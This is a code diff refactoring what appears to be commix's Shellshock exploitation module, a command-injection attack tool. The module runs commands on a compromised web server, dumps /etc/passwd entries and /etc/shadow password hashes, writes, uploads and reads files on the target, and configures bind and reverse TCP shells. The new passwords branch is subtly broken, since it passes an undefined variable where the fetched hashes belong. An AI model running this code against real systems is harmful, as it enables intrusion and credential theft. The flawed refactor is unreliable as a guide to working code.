@@ -78,49 +78,23 @@ def shellshock_exploitation(cve, cmd):
 Enumeration Options
 """
 def enumeration(url, cve, check_header, filename):
-
-  #-------------------------------
-  # Hostname enumeration
-  #-------------------------------
+  _ = False
   if menu.options.hostname:
     info_msg = "Fetching hostname."
     print(settings.print_info_msg(info_msg))
     cmd = settings.HOSTNAME
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if shell:
-      info_msg = "Hostname: " +  str(shell) + "."
-      print(settings.print_bold_info_msg(info_msg))
-      # Add infos to logs file. 
-      output_file = open(filename, "a")
-      if not menu.options.no_logging:
-        info_msg = info_msg + "\n"
-        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
-      output_file.close()
-    else:
-      warn_msg = "Heuristics have failed to identify the hostname."
-      print(settings.print_warning_msg(warn_msg)) 
+      checks.print_hostname(shell, filename, _)
     settings.ENUMERATION_DONE = True
 
-  #-------------------------------
-  # The current user enumeration
-  #-------------------------------
   if menu.options.current_user:
     info_msg = "Fetching current user."
     print(settings.print_info_msg(info_msg))
     cmd = settings.CURRENT_USER
     cu_account, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if cu_account:
-      info_msg = "Current user: " +  str(cu_account) + "."
-      print(settings.print_bold_info_msg(info_msg))
-      # Add infos to logs file.   
-      output_file = open(filename, "a")
-      if not menu.options.no_logging:
-        info_msg = "Current user: " + str(cu_account) + ".\n"
-      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
-      output_file.close()  
-    else:
-      warn_msg = "Heuristics have failed to fetch the current user."
-      print(settings.print_warning_msg(warn_msg))
+      checks.print_current_user(cu_account, filename, _)
     settings.ENUMERATION_DONE = True
 
   if menu.options.is_root:
@@ -129,22 +103,10 @@ def enumeration(url, cve, check_header, filename):
     cmd = re.findall(r"" + "\$(.*)", settings.IS_ROOT)
     cmd = ''.join(cmd).replace("(","").replace(")","")
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    _ = "True"
-    if (settings.TARGET_OS == "win" and not "Admin" in shell) or \
-       (settings.TARGET_OS != "win" and shell != "0"):
-      _ = "False"
+    if shell:
+      checks.print_current_user_privs(shell, filename, _)
+    settings.ENUMERATION_DONE = True
 
-    info_msg = "Current user has excessive privileges: " +  str(_)  
-    print(settings.print_bold_info_msg(info_msg))
-    # Add infos to logs file.    
-    output_file = open(filename, "a")
-    if not menu.options.no_logging:
-      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
-    output_file.close()
-
-  #-------------------------------
-  # Retrieve system information
-  #-------------------------------
   if menu.options.sys_info:
     info_msg = "Fetching the underlying operating system information."
     print(settings.print_info_msg(info_msg))
@@ -158,191 +120,27 @@ def enumeration(url, cve, check_header, filename):
           target_os = target_os + " " + distro_name
         cmd = settings.RECOGNISE_HP
         target_arch, payload = cmd_exec(url, cmd, cve, check_header, filename)
-        if target_os and target_arch:
-          info_msg = "Operating system: " + str(target_os) + " (" + str(target_arch) + ")"
-          print(settings.print_bold_info_msg(info_msg))
-          # Add infos to logs file.   
-          output_file = open(filename, "a")
-          if not menu.options.no_logging:
-            info_msg = info_msg + "\n"
-            output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
-          output_file.close()
-      else:
-        info_msg = "Operating system: " +  target_os  + "."  
-        print(settings.print_bold_info_msg(info_msg))
-        # Add infos to logs file.    
-        output_file = open(filename, "a")
-        if not menu.options.no_logging:
-          info_msg = "Operating system: " + str(target_os) + ".\n"
-          output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
-        output_file.close()
-    else:
-      warn_msg = "Heuristics have failed to fetch underlying operating system information."
-      print(settings.print_warning_msg(warn_msg))
+        checks.print_os_info(target_os, target_arch, filename, _)
     settings.ENUMERATION_DONE = True
 
-  #-------------------------------
-  # System users enumeration
-  #-------------------------------
   if menu.options.users:
     cmd = settings.SYS_USERS             
-    sys_users, payload = cmd_exec(url, cmd, cve, check_header, filename)
     info_msg = "Fetching content of the file '" + settings.PASSWD_FILE 
     info_msg += "' in order to enumerate users entries. "  
     print(settings.print_info_msg(info_msg))
-    try:
-      if sys_users[0] :
-        sys_users = "".join(str(p) for p in sys_users).strip()
-        if len(sys_users.split(" ")) <= 1 :
-          sys_users = sys_users.split("\n")
-        else:
-          sys_users = sys_users.split(" ")
-        # Check for appropriate '/etc/passwd' format.
-        if len(sys_users) % 3 != 0 :
-          warn_msg = "It seems that '" + settings.PASSWD_FILE + "' file is "
-          warn_msg += "not in the appropriate format. Thus, it is expoted as a text file."
-          print(settings.print_warning_msg(warn_msg))
-          sys_users = " ".join(str(p) for p in sys_users).strip()
-          print(sys_users)
-          output_file = open(filename, "a")
-          if not menu.options.no_logging:
-            output_file.write("      " + sys_users)
-          output_file.close()
-        else:  
-          sys_users_list = []
-          for user in range(0, len(sys_users), 3):
-             sys_users_list.append(sys_users[user : user + 3])
-          if len(sys_users_list) != 0 :
-            info_msg = "Identified " + str(len(sys_users_list)) 
-            info_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
-            info_msg += " in '" +  settings.PASSWD_FILE + "'."
-            print(settings.print_bold_info_msg(info_msg))
-            # Add infos to logs file.   
-            output_file = open(filename, "a")
-            if not menu.options.no_logging:
-              output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
-            output_file.close()
-            count = 0
-            for user in range(0, len(sys_users_list)):
-              sys_users = sys_users_list[user]
-              sys_users = ":".join(str(p) for p in sys_users)
-              count = count + 1
-              fields = sys_users.split(":")
-              fields1 = "".join(str(p) for p in fields)
-              # System users privileges enumeration
-              try:
-                if not fields[2].startswith("/"):
-                  raise ValueError()
-                if menu.options.privileges:
-                  if int(fields[1]) == 0:
-                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
-                    is_privileged_nh = " is root user "
-                  elif int(fields[1]) > 0 and int(fields[1]) < 99 :
-                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
-                    is_privileged_nh = " is system user "
-                  elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
-                    if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
-                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
-                      is_privileged_nh = " is anonymous user "
-                    elif int(fields[1]) == 60002:
-                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
-                      is_privileged_nh = " is non-trusted user "   
-                    else:
-                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
-                      is_privileged_nh = " is regular user "
-                  else :
-                    is_privileged = ""
-                    is_privileged_nh = ""
-                else :
-                  is_privileged = ""
-                  is_privileged_nh = ""
-                print("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT + fields[0] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.") 
-                # Add infos to logs file.   
-                output_file = open(filename, "a")
-                if not menu.options.no_logging:
-                  output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + fields[0] + "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
-                output_file.close()
-              except ValueError:
-                if count == 1 :
-                  warn_msg = "It seems that '" + settings.PASSWD_FILE + "' file is not in the "
-                  warn_msg += "appropriate format. Thus, it is expoted as a text file." 
-                  print(settings.print_warning_msg(warn_msg))
-                sys_users = " ".join(str(p) for p in sys_users.split(":"))
-                print(sys_users) 
-                output_file = open(filename, "a")
-                if not menu.options.no_logging:
-                  output_file.write("      " + sys_users)
-                output_file.close()
-      else:
-        print(settings.SINGLE_WHITESPACE)
-        warn_msg = "It seems that you don't have permissions to read the '" 
-        warn_msg += settings.PASSWD_FILE + "'."
-        ptint(settings.print_warning_msg(warn_msg))  
-    except TypeError:
-      pass
-    except IndexError:
-      print(settings.SINGLE_WHITESPACE)
-      warn_msg = "Some kind of WAF/IPS/IDS probably blocks the attempt to read '" 
-      warn_msg += settings.PASSWD_FILE + "' to enumerate users entries." 
-      print(settings.print_warning_msg(warn_msg))
-      pass    
+    sys_users, payload = cmd_exec(url, cmd, cve, check_header, filename)
+    if sys_users:
+      checks.print_users(sys_users, filename, _) 
     settings.ENUMERATION_DONE = True
 
-  #-------------------------------------
-  # System password enumeration
-  #-------------------------------------
   if menu.options.passwords:
+    info_msg = "Fetching content of the file '" + settings.SHADOW_FILE 
+    info_msg += "' in order to enumerate users password hashes. "  
+    print(settings.print_info_msg(info_msg))
     cmd = settings.SYS_PASSES            
     sys_passes, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if sys_passes :
-      sys_passes = "".join(str(p) for p in sys_passes)
-      sys_passes = sys_passes.replace(" ", "\n")
-      sys_passes = sys_passes.split( )
-      if len(sys_passes) != 0 :
-        info_msg = "Fetching content of the file '" + settings.SHADOW_FILE 
-        info_msg += "' in order to enumerate users password hashes. "  
-        print(settings.print_info_msg(info_msg))
-        sys_passes = sys_passes.replace(" ", "\n")
-        sys_passes = sys_passes.split()
-        if len(sys_passes) != 0 :
-          info_msg = "Identified " + str(len(sys_passes))
-          info_msg += " entr" + ('ies', 'y')[len(sys_passes) == 1] 
-          info_msg += " in '" +  settings.SHADOW_FILE + "'."
-          print(settings.print_bold_info_msg(info_msg))
-          # Add infos to logs file.   
-          output_file = open(filename, "a")
-          if not menu.options.no_logging:
-            output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg )
-          output_file.close()
-          count = 0
-          for line in sys_passes:
-            count = count + 1
-            try:
-              if ":" in line:
-                fields = line.split(":")
-                if not "*" in fields[1] and not "!" in fields[1] and fields[1] != "":
-                  print("  (" +str(count)+ ") " + Style.BRIGHT + fields[0] + Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL)
-                  # Add infos to logs file.   
-                  output_file = open(filename, "a")
-                  if not menu.options.no_logging:
-                    output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") " + fields[0] + " : " + fields[1] + "\n")
-                  output_file.close()
-            # Check for appropriate '/etc/shadow' format.
-            except IndexError:
-              if count == 1 :
-                warn_msg = "It seems that '" + settings.SHADOW_FILE + "' file is not "
-                warn_msg += "in the appropriate format. Thus, it is expoted as a text file."
-                print(settings.print_warning_msg(warn_msg))
-              print(fields[0])
-              output_file = open(filename, "a")
-              if not menu.options.no_logging:
-                output_file.write("      " + fields[0])
-              output_file.close()
-        else:
-          warn_msg = "It seems that you don't have permissions to read the '" 
-          warn_msg += settings.SHADOW_FILE + "' file."
-          print(settings.print_warning_msg(warn_msg))
-
+      checks.print_users(sys_users, filename, _)
     settings.ENUMERATION_DONE = True  
 
 """
@@ -350,121 +148,32 @@ File Access Options
 """
 def file_access(url, cve, check_header, filename):
 
-  #-------------------------------------
-  # Write to a file on the target host.
-  #-------------------------------------
   if menu.options.file_write:
-    file_to_write = menu.options.file_write.encode(settings.DEFAULT_CODEC).decode()
-    if not os.path.exists(file_to_write):
-      warn_msg = "It seems that the provided local file '" + file_to_write + "', does not exist."
-      print(settings.print_warning_msg(warn_msg))
-      raise SystemExit()
-      
-    if os.path.isfile(file_to_write):
-      with open(file_to_write, 'r') as content_file:
-        content = [line.replace("\r\n", "\n").replace("\r", "\n").replace("\n", " ") for line in content_file]
-      content = "".join(str(p) for p in content).replace("'", "\"")
-    else:
-      warn_msg = "It seems that '" + file_to_write + "' is not a file."
-      print(settings.print_warning_msg(warn_msg))
+    file_to_write, dest_to_write, content = checks.check_file_to_write()
+    cmd = checks.write_content(content, dest_to_write)
+    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
+    cmd = checks.check_file(dest_to_write)
+    cmd = checks.remove_command_substitution(cmd)
+    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
+    checks.file_write_status(shell, dest_to_write)
     settings.FILE_ACCESS_DONE = True
 
-    #-------------------------------
-    # Check the file-destination
-    #-------------------------------
-    if os.path.split(menu.options.file_dest)[1] == "" :
-      dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
-    elif os.path.split(menu.options.file_dest)[0] == "/":
-      dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
-    else:
-      dest_to_write = menu.options.file_dest
-      
-    # Execute command
-    cmd = settings.FILE_WRITE + " '" + content + "'" + ">" + "'" + dest_to_write + "'"
-    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    
-    # Check if file exists!
-    cmd = "ls " + dest_to_write + ""
-    # Check if defined cookie injection.
-    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    if shell:
-      info_msg = "The file has been successfully created on remote directory '" + dest_to_write + "'." 
-      print(settings.print_bold_info_msg(info_msg))
-    else:
-      warn_msg = "It seems that you don't have permissions to write the '"
-      warn_msg += dest_to_write + "' file."
-      print(settings.print_warning_msg(warn_msg))
-    settings.FILE_ACCESS_DONE = True
-
-  #-------------------------------------
-  # Upload a file on the target host.
-  #-------------------------------------
   if menu.options.file_upload:
-    file_to_upload = menu.options.file_upload.encode(settings.DEFAULT_CODEC).decode()
-    # check if remote file exists.
-    try:
-      _urllib.request.urlopen(file_to_upload, timeout=settings.TIMEOUT)
-    except _urllib.error.HTTPError as warn_msg:
-      warn_msg = "It seems that the '" + file_to_upload + "' file, "
-      warn_msg += "does not exist. (" + str(warn_msg) + ")"
-      print(settings.print_critical_msg(warn_msg))
-      raise SystemExit()
-    except ValueError as err_msg:
-      err_msg = str(err_msg[0]).capitalize() + str(err_msg)[1]
-      print(settings.print_critical_msg(err_msg))
-      print(settings.SINGLE_WHITESPACE)
-      raise SystemExit() 
-
-    # Check the file-destination
-    if os.path.split(menu.options.file_dest)[1] == "" :
-      dest_to_upload = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_upload)[1]
-    elif os.path.split(menu.options.file_dest)[0] == "/":
-      dest_to_upload = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_upload)[1]
-    else:
-      dest_to_upload = menu.options.file_dest
-      
-    # Execute command
-    cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
+    cmd, dest_to_upload = checks.check_file_to_upload()
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     shell = "".join(str(p) for p in shell)
-    
-    # Check if file exists!
-    cmd = "ls " + dest_to_upload
+    cmd = checks.check_file(dest_to_upload)
+    cmd = checks.remove_command_substitution(cmd)
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     shell = "".join(str(p) for p in shell)
-    if shell:
-      info_msg = "The file has been successfully uploaded on remote directory '" + dest_to_upload + "'."
-      print(settings.print_bold_info_msg(info_msg))
-    else:
-      warn_msg = "It seems that you don't have permissions "
-      warn_msg += "to upload the '" + dest_to_upload + "' file."
-      print(settings.print_warning_msg(warn_msg))
+    checks.file_upload_status(shell, dest_to_upload)
     settings.FILE_ACCESS_DONE = True
 
-  #-------------------------------------
-  # Read a file from the target host.
-  #-------------------------------------
   if menu.options.file_read:
-    file_to_read = menu.options.file_read.encode(settings.DEFAULT_CODEC).decode()
-    info_msg = "Fetching content of the file: '"  
-    info_msg += file_to_read + "'."
-    print(settings.print_info_msg(info_msg))
-    # Execute command
-    cmd = "cat " + settings.FILE_READ + file_to_read
+    cmd, file_to_read = checks.file_content_to_read()
+    cmd = checks.remove_command_substitution(cmd)
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    if shell: 
-      _ = "Fetched file content"
-      print(settings.print_retrieved_data(_, shell))
-      output_file = open(filename, "a")
-      if not menu.options.no_logging:
-        info_msg = "Fetched file content '"
-        info_msg += file_to_read + "' : " + shell + "\n"
-        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
-      output_file.close()
-    else:
-      warn_msg = "It seems that you don't have permissions "
-      warn_msg += "to read the '" + file_to_read + "' file."
-      print(settings.print_warning_msg(warn_msg))
+    checks.file_read_status(shell, file_to_read, filename)
     settings.FILE_ACCESS_DONE = True
 
 """
@@ -480,21 +189,17 @@ def execute_shell(url, cmd, cve, check_header, filename, os_shell_option):
 Configure the bind TCP shell
 """
 def bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again):
-
   settings.BIND_TCP = True
   # Set up RHOST / LPORT for the bind TCP connection.
   bind_tcp.configure_bind_tcp(separator = "")
-
   if settings.BIND_TCP == False:
     if settings.REVERSE_TCP == True:
       os_shell_option = "reverse_tcp"
       reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
     return go_back, go_back_again
-
   while True:
     if settings.RHOST and settings.LPORT in settings.SHELL_OPTIONS:
       result = checks.check_bind_tcp_options(settings.RHOST)
-
     else:  
       cmd = bind_tcp.bind_tcp_options(separator = "")
       result = checks.check_bind_tcp_options(cmd)
@@ -505,7 +210,6 @@ def bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http
         go_back_again = True
         settings.BIND_TCP = False
       return go_back, go_back_again
-
     # execute bind TCP shell 
     execute_shell(url, cmd, cve, check_header, filename, os_shell_option)
 
@@ -513,17 +217,14 @@ def bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http
 Configure the reverse TCP shell
 """
 def reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again):
-
   settings.REVERSE_TCP = True
   # Set up LHOST / LPORT for the reverse TCP connection.
   reverse_tcp.configure_reverse_tcp(separator = "")
-
   if settings.REVERSE_TCP == False:
     if settings.BIND_TCP == True:
       os_shell_option = "bind_tcp"
       bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
     return go_back, go_back_again
-
   while True:
     if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
       result = checks.check_reverse_tcp_options(settings.LHOST)
@@ -537,7 +238,6 @@ def reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, h
         go_back_again = True
         settings.REVERSE_TCP = False
       return go_back, go_back_again
-
     # execute bind TCP shell 
     execute_shell(url, cmd, cve, check_header, filename, os_shell_option)
 
@@ -545,12 +245,14 @@ def reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, h
 Check commix shell options
 """
 def check_options(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again,no_result):
-
   if os_shell_option == False:
     if no_result == True:
       return False
     else:
       return True 
+
+  if os_shell_option == None:
+    return go_back, go_back_again
 
   # The "back" option
   elif os_shell_option == "back":
@@ -599,7 +301,7 @@ def shellshock_handler(url, http_request_method, filename):
         settings.DETECTION_PHASE = True
         settings.EXPLOITATION_PHASE = False
         i = i + 1
-        attack_vector = "echo " + cve + ":Done;"
+        attack_vector = "echo" + " " + cve + ":Done;"
         payload = shellshock_payloads(cve, attack_vector)
 
         # Check if defined "--verbose" option.
@@ -721,7 +423,7 @@ def shellshock_handler(url, http_request_method, filename):
               print(settings.print_retrieved_data(_, shell))
             else:
               err_msg = "The execution of '" + cmd + "' command does not return any output."
-              print(settings.print_critical_msg(err_msg))
+              print(settings.print_error_msg(err_msg))
 
           try:
             # Pseudo-Terminal shell
@@ -751,31 +453,29 @@ def shellshock_handler(url, http_request_method, filename):
                       go_back, go_back_again = check_options(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again, no_result)
                       if go_back and go_back_again == False:
                         break
-                    else:
-                      logs.logs_notification(filename)
-                      return True
+                      if go_back and go_back_again:
+                        return True 
+                    # else:
+                    #   logs.logs_notification(filename)
+                    #   return True
                   else: 
                     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
                     if shell != "":
                       # Update logs with executed cmds and execution results.
                       logs.executed_command(filename, cmd, shell)
-                      print(settings.SINGLE_WHITESPACE)
-                      print(Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL)
-                      print(settings.SINGLE_WHITESPACE)
+                      print(settings.command_execution_output(shell))
                     else:
                       debug_msg = "Executing the '" + cmd + "' command. "
                       if settings.VERBOSITY_LEVEL == 1:
                         print(settings.print_debug_msg(debug_msg))
-                        print(settings.SINGLE_WHITESPACE)
                         print(settings.print_payload(payload))
-                        print(settings.SINGLE_WHITESPACE)
                       elif settings.VERBOSITY_LEVEL >= 2:
                         print(settings.print_debug_msg(debug_msg))
-                        print(settings.SINGLE_WHITESPACE)
                         sys.stdout.write(settings.print_payload(payload))
+                      if settings.VERBOSITY_LEVEL >= 2:
                         print(settings.SINGLE_WHITESPACE)
                       err_msg = "The execution of '" + cmd + "' command does not return any output."
-                      print(settings.print_critical_msg(err_msg))
+                      print(settings.print_error_msg(err_msg))
               elif gotshell in settings.CHOICE_NO:
                 if checks.next_attack_vector(technique, go_back) == True:
                   break
